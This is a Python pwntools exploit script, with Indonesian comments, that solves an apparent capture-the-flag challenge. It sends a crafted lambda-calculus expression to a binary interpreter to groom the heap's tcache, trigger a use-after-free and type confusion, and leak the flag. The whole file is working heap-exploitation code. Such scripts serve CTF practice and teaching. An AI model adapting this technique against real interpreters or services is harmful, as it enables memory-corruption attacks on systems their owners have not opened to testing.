#!/usr/bin/env python3
#!/usr/bin/env python3
from pwn import *

def solve():
    # Setup context
    elf = context.binary = ELF("./interpreter")
    host = "chals.vuwctf.com"
    port = 1337 # Ganti port sesuai soal
    
    # Run lokal dulu, ganti ke remote kalau udah yakin
    r = process("./interpreter")
    # r = remote(host, port)
    
    mu = b'\xc2\xb5'
    
    # 1. Konstruksi Tcache Grooming Payload
    # A akan di-free duluan untuk ngisi Tcache dengan urutan memori yang kita mau
    A = b"((" + mu + b"e.(c d)) (" + mu + b"f.f))"
    Q = b"(" + mu + b"q.q)"
    
    # Ini variabel yang bakal kena kutukan UAF (v dan w bakal nempel di memori yang sama)
    v_w_part = b"(((" + mu + b"k.k) (" + mu + b"z.v)) w)"
    
    # Core evaluasi: mensimulasikan logic Type Confusion secara normal order
    body = b"((" + mu + b"a.((" + mu + b"y.((" + mu + b"x.(y x)) " + Q + b")) " + v_w_part + b")) " + A + b")"
    
    # 2. Wrapper variabel global (c, d, v, w) biar parser nggak teriak "Unbound variable"
    payload = b"(" + mu + b"c.(" + mu + b"d.(" + mu + b"v.(" + mu + b"w." + body + b"))))"
    
    log.info("Sending the ultimate Heap Grooming lambda expression...")
    r.sendlineafter(b"Enter your lambda expression:\n", payload)
    
    # Target AST kita pas w tepat selesai di-free
    target_ast = b"(" + mu + b"c.(" + mu + b"d.(" + mu + b"v.(" + mu + b"w.(v (" + mu + b"q.q))))))"
    
    cycle = 1
    while True:
        try:
            r.recvuntil(b"======================\n")
            expr = r.recvline().strip()
            log.info(f"[Cycle {cycle}] Current AST: {expr.decode('utf-8', errors='ignore')}")
            
            r.recvuntil(b"continue:\n")
            
            # Cek apakah kita sudah di fase evaluasi (v Q) yang menandakan w udah di-free
            if target_ast in expr:
                log.success("Ghost pointer is ALIGNED! Reading flag into Tcache NOW...")
                
                # Tekan 'r' 1 kali untuk injeksi flag ke chunk 'w' yang lagi nganggur
                r.sendline(b"r")
                r.recvuntil(b"continue:\n")
                
                log.info("Triggering Type Confusion and Leaking Memory...")
                r.sendline(b"c") # Lanjut evaluasi untuk nabrak UAF
                
                # Tangkap output final dari terminal (Flag bakal kecetak di sini)
                final_output = r.recvall(timeout=3)
                lines = final_output.split(b'\n')
                for line in lines:
                    if b"UNKNOWN_DATA" in line or b"VuwCTF{" in line:
                        print(f"\n[+] FLAG LEAKED: {line.decode('utf-8', errors='ignore')}\n")
                break
            else:
                # Kalau belum nyampe target AST, kita suruh interpreter lanjut reduksi
                r.sendline(b"c")
                cycle += 1
                
        except EOFError:
            log.error("Program crashed unexpectedly. Send me the exact cycle log so we can debug!")
            break

if __name__ == "__main__":
    solve()
